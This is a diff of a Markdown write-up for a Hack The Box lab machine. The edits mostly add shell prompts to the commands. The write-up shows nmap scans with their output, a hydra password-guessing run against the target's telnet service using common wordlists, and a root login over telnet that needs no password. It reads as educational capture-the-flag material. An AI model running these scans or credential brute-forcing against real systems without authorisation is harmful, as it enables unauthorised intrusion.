@@ -11,7 +11,7 @@
 - Quick TCP:
 
 ```bash
-nmap target.htb
+$ nmap target.htb
 Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-08 13:21 -0400
 Nmap scan report for target.htb (10.129.97.216)
 Host is up (0.061s latency).
@@ -25,7 +25,7 @@ Nmap done: 1 IP address (1 host up) scanned in 1.25 seconds
 - Targeted Scan:
 
 ```bash
-nmap target.htb -sV -sC -A -p23 -vv
+$ nmap target.htb -sV -sC -A -p23 -vv
 Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-08 13:23 -0400
 NSE: Loaded 158 scripts for scanning.
 NSE: Script Pre-scanning.
@@ -116,7 +116,7 @@ Nmap done: 1 IP address (1 host up) scanned in 24.47 seconds
 - Full TCP:
 
 ```bash
-nmap target.htb -sC -sV -A -T4 -vv -p-
+$ nmap target.htb -sC -sV -A -T4 -vv -p-
 ...
 Same as Targeted Scan above
 ```
@@ -143,7 +143,7 @@ Meow login:
 - Enumeration: I don't have a username or password. I will have hydra guess for me.
 
 ```bash
-hydra -L Usernames/top-usernames-shortlist.txt -P Passwords/Common-Credentials/top-passwords-shortlist.txt target.htb telnet
+$ hydra -L Usernames/top-usernames-shortlist.txt -P Passwords/Common-Credentials/top-passwords-shortlist.txt target.htb telnet
 Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-08 13:43:01
@@ -181,7 +181,7 @@ It appears that the username root will work with any password. So I try that.
 - Steps/Commands:
 
 ```bash
-telnet target.htb
+$ telnet target.htb
 Trying 10.129.97.216...
 Connected to target.htb.
 Escape character is '^]'.
@@ -249,5 +249,8 @@ b40abdfe23665f766f9c61ecba8a4c19
 - Dead Ends: Full Nmap scan found nothing that the Target Scan hadn't already found
 - Reusable Commands:
 
-- `hydra -L Usernames/top-usernames-shortlist.txt -P Passwords/Common-Credentials/top-passwords-shortlist.txt target.htb telnet`
-- `sudo apt install seclists`
+```bash
+hydra -L Usernames/top-usernames-shortlist.txt -P Passwords/Common-Credentials/top-passwords-shortlist.txt target.htb telnet`
+
+sudo apt install seclists
+```
